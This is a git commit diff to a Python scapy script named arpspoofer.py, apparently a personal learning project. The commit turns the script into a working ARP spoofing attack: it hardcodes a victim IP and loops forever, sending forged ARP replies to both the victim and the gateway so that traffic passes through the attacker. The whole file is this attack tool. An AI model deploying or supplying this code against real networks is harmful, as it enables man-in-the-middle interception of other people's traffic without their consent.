1f77136a1bbb55a2fedcc5aea667daa7e91ef535
Hambihambi <134943206+Hambihambi@users.noreply.github.com>
2025-02-17 23:11:18 +0100

    more changes, work still in progress

--- arpspoofer.py
+++ arpspoofer.py
@@ -1,6 +1,7 @@
 import scapy.all as scapy
+import time
 
-victim = "192.168.56.101" #input("Enter victim IP address: ")
+victim = "192.168.0.218" #input("Enter victim IP address: ")
 gw = scapy.conf.route.route("0.0.0.0")[2]
 
 def get_mac(ip):
@@ -15,19 +16,23 @@ def get_mac(ip):
         print(f'[!] No response received for {ip}. Check network connectivity and permissions!')
         return None
 
-def spoof(victim_ip, gateway_ip):
+def spoof(victim_ip, spoof_ip):
     target_mac = get_mac(victim_ip)
     if target_mac is None:
         print(f'[!] Could not get MAC address for {victim_ip}. Exiting...')
         
-    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=gateway_ip)
+    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
     
-    print(f"MAC Address of {victim}: {mac_address}")
-    print(f'[+] ARP response sent to {victim_ip}, spoofing {gateway_ip}')
+    '''print(f'[+] MAC Address of {victim}: {target_mac}   ')
+    print(f'[+] ARP response sent to {victim_ip}, spoofing {spoof_ip}')'''
 
-#spoof(victim, gw)
-mac_address = get_mac(victim)
+while True:
+    spoof(gw, victim)
+    spoof(victim, gw)
+    time.sleep(2)
+
+'''mac_address = get_mac(victim)
 if mac_address:
     print(f"MAC Address of {victim}: {mac_address}")
-print(f"Default Gateway: {gw}")
+print(f"Default Gateway: {gw}")'''
